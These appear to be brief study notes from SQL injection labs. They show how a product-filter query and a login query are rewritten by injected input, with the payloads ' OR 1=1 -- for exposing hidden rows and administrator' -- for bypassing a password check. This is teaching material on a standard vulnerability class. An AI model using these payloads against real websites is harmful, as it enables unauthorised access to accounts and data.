## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
```

> Payload: `' OR 1=1 --`

## SQL injection vulnerability allowing login bypass

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'SuperP@ssword'
SELECT * FROM users WHERE username = 'administrator' --' AND password = 'SuperP@ssword'
```

> Payload : `administrator' --`

